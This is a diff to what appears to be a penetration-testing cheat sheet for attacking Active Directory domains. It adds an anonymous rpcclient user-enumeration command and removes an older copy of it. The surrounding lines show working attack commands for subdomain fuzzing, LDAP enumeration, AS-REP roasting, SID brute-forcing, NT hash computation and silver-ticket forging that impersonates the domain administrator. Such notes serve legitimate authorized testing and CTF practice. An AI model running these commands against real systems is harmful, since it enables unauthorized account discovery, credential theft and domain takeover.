@@ -122,6 +122,7 @@ ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/
 sudo systemctl start openntpd; sudo ntpdate -b $TARGET; sudo hwclock --systohc; timedatectl set-ntp false; timedatectl status
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' | grep -Ei 'dns'
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
+rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]' | tee usernames
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames
@@ -764,7 +765,6 @@ echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | 
 cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; export KRB5CCNAME=`pwd`/administrator.ccache
 
 [*] (135) RPC
-rpcclient -U "" -N $TARGET -c "enumdomusers"
 rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "enumdomusers"
 rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "lsaquery"
 rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "querydispinfo" | grep -oP 'Account:.*' | sed 's/Name:.*Desc:/Desc:/'
